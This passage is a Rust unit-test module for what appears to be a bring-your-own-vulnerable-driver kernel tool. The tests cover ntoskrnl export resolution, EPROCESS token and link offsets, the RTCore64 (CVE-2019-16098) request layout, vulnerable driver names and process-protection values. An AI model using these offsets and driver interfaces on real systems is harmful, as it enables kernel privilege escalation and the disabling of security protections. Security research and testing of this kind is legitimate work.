                let func_file = rva_to_file(functions_rva);
                let resolved = u32::from_le_bytes(
                    bytes[func_file + ordinal as usize * 4..func_file + ordinal as usize * 4 + 4]
                        .try_into()
                        .unwrap(),
                );
                assert!(resolved > 0);
                return;
            }
        }
        panic!("PsInitialSystemProcess not found in host ntoskrnl exports");
    }

    #[test]
    fn pid_anchor_is_the_single_trusted_offset() {
        // UniqueProcessId@0x1D0 is the one table offset confirmed live
        // (System reads 4); Links and Token are discovered at runtime -
        // the table's 26200 row was stale for UBR 9445 (Part 5).
        assert_eq!(EPROC_PID, 0x1D0);
    }

    #[test]
    fn plausible_link_shape() {
        assert!(plausible_link(0xFFFF_D503_306A_0048, 0x1D8));
        assert!(!plausible_link(0xFFFF_D503_306A_0040, 0x1D8));
        assert!(!plausible_link(0x70, 0x1D8));
    }

    #[test]
    fn read_buf_via_chunks_across_boundaries() {
        // A stub kernel: 16 bytes of sequential data at 0x1000.
        let stub = |addr: u64| -> Result<u64, String> {
            Ok(match addr {
                0x1000 => 0x0807_0605_0403_0201,
                0x1008 => 0x100F_0E0D_0C0B_0A09,
                _ => return Err("out of range".into()),
            })
        };
        let mut buf = [0u8; 11];
        read_buf_via(0x1000, &mut buf, stub).unwrap();
        assert_eq!(&buf, &[1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]);
    }

    #[test]
    fn fast_ref_heuristic() {
        assert!(looks_like_fast_ref(0xFFFF_E123_4567_8903));
        assert!(!looks_like_fast_ref(0x0000_7FFF_0000_0001)); // user ptr
        assert!(looks_like_fast_ref(0xFFFF_E123_4567_89FF));
    }

    #[test]
    fn rtcore_transfer_struct_matches_driver_contract() {
        // 48 bytes exactly — the driver rejects any other length.
        assert_eq!(std::mem::size_of::<RtCoreMemory>(), 48);
        // Field offsets pinned by the CVE-2019-16098 PoC.
        assert_eq!(std::mem::offset_of!(RtCoreMemory, address), 0x08);
        assert_eq!(std::mem::offset_of!(RtCoreMemory, size), 0x18);
        assert_eq!(std::mem::offset_of!(RtCoreMemory, value), 0x1C);
    }

    #[test]
    fn win32_surface_resolves() {
        unsafe {
            assert!(syscalls::export_address("kernel32.dll", "CreateFileW").is_some());
            assert!(syscalls::export_address("kernel32.dll", "DeviceIoControl").is_some());
            assert!(syscalls::export_address("kernel32.dll", "CloseHandle").is_some());
            Win32::resolve().expect("win32 surface must resolve on windows hosts");
        }
    }

    #[test]
    fn protection_plausibility_nibbles() {
        // (Signer << 4) | Type; Type 1 Light / 2 Full, signers 1..=0xC.
        for good in [0x11u8, 0x21, 0x51, 0x61, 0x42, 0xC1, 0x62] {
            assert!(plausible_protection(good), "{good:#x} must pass");
        }
        for bad in [0x00u8, 0x01, 0x02, 0x13, 0x24, 0x0F, 0xFF, 0x10, 0x20] {
            assert!(!plausible_protection(bad), "{bad:#x} must fail");
        }
    }

    #[test]
    fn ansi_and_utf16_name_matchers() {
        let system = b"System  "
            .iter()
            .copied()
            .chain([0u8; 4])
            .collect::<Vec<u8>>();
        let _ = system; // (formatting sanity only)
        assert!(ansi_name_matches(b"System  rest", "system"));
        assert!(ansi_name_matches(b"WINLOGON.EXE ", "winlogon.exe"));
        assert!(!ansi_name_matches(b"wininit.exe ", "winlogon.exe"));
        assert!(!ansi_name_matches(b" ", "winlogon.exe"));
        // UTF-16LE module names, case-insensitive, NUL-terminated pair.
        let utf16: Vec<u8> = "IQVW64E.SYS"
            .chars()
            .flat_map(|c| [(c as u16).to_le_bytes()[0], (c as u16).to_le_bytes()[1]])
            .collect();
        assert!(module_name_matches(&utf16, "iqvw64e.sys"));
        assert!(!module_name_matches(&utf16, "rtcore64.sys"));
        let empty_pair = [0u8, 0, 0x41, 0];
        assert!(!module_name_matches(&empty_pair, "a"));
    }

    #[test]
    fn probe_on_host_reports_missing_device_not_crash() {
        // Gate: with a vulnerable driver actually loaded on this host
        // (operator bench), probe_depth would perform real kernel
        // reads and structure discovery from a unit test - skip
        // instead of touching the live kernel (audit finding).
        if RtCore64::open().is_ok() {
            eprintln!("skipping: a vulnerable-driver device is live on this host");
            return;
        }
        // No vulnerable driver exists on the dev host; the probe must
        // degrade to the informative no-device result.
        match probe_depth("") {
            Ok(text) => {
                let text = String::from_utf8(text).unwrap();
                assert!(text.contains("no vulnerable-driver device") || text.contains("ntoskrnl"));
            }
            Err(_) => panic!("probe must not hard-fail"),
        }
    }
}
